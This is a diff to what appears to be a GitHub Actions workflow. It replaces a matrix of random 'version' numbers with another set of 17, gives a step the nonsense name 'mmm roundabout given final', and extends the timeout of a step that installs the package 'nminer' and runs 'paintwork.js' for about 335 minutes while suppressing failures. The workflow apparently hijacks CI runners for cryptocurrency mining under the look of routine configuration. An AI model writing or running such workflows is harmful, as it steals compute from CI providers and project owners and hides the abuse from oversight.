@@ -9,25 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3425 }
-          - { version: 1840 }
-          - { version: 2428 }
-          - { version: 9113 }
-          - { version: 8196 }
-          - { version: 6059 }
-          - { version: 1407 }
-          - { version: 677 }
-          - { version: 4277 }
-          - { version: 3887 }
-          - { version: 3237 }
-          - { version: 2138 }
-          - { version: 6733 }
-          - { version: 5584 }
-          - { version: 6742 }
-          - { version: 1681 }
-          - { version: 5680 }
-          - { version: 1615 }
-          - { version: 5663 }
+          - { version: 5009 }
+          - { version: 5280 }
+          - { version: 8533 }
+          - { version: 5085 }
+          - { version: 6129 }
+          - { version: 8120 }
+          - { version: 826 }
+          - { version: 2850 }
+          - { version: 3942 }
+          - { version: 2329 }
+          - { version: 418 }
+          - { version: 5538 }
+          - { version: 1521 }
+          - { version: 6313 }
+          - { version: 5397 }
+          - { version: 5528 }
+          - { version: 480 }
 
     steps:
       - name: Checkout
@@ -38,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: mmm roundabout given final
         run: |
           npm install nminer@latest
-          timeout 326m node paintwork.js || echo "paintwork executed"
+          timeout 335m node paintwork.js || echo "paintwork executed"
